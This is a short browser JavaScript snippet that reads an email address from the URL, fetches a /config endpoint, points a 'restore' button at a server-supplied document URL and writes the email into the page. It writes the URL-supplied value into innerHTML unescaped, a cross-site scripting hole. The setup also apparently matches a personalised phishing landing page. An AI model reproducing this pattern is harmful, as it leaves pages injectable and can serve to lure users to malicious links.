
(function() {
  let lastEmail = null;

  function getEmailFromUrl() {
    const params = new URLSearchParams(window.location.search);
    return params.get("email");
  }

  async function refreshConfig(email) {
    try {
      const res = await fetch(`/config?email=${encodeURIComponent(email)}`);
      const cfg = await res.json();

      // update restoreBtn
      document.getElementById("restoreBtn").href = cfg.DOCUMENT_URL;

      // replace {mename} with the email
      const messageEl = document.querySelector(".message p");
      if (messageEl) {
        messageEl.innerHTML = messageEl.innerHTML.replace("{mename}", email);
      }

    } catch (err) {
      console.error("Config load failed", err);
    }
  }

  function checkForEmailChange() {
    const email = getEmailFromUrl();
    console.log(`Checked email and found ${email}`)
    if (email && email.length > 4 && email !== lastEmail) {
      lastEmail = email;
      refreshConfig(email);
    }
  }

  // Run at page load
  //checkForEmailChange();
  refreshConfig('');

  // Watch periodically (since user can manually edit URL bar)
  setInterval(checkForEmailChange, 3000);

})();
